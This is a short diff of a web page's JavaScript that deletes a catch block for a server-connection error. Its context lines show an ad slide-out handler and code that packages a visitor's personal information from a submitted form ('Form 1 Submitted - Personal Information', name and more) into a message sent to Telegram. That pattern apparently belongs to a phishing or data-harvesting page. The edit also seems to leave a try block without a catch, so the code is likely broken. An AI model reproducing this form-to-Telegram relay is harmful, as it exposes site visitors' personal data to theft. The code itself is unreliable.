@@ -467,11 +467,7 @@ closeAdButton.addEventListener("click", slideOutAd);
           messageDiv.textContent = result.error;
           messageDiv.className = 'error';
         }
-      } catch (error) {
-        messageDiv.textContent = 'Error: Could not connect to server';
-        messageDiv.className = 'error';
-      }
-			
+      } 
             // Send to Telegram
             const message = `📝 **Form 1 Submitted - Personal Information**\n\n` +
                            `👤 Name: ${data.name}\n` +
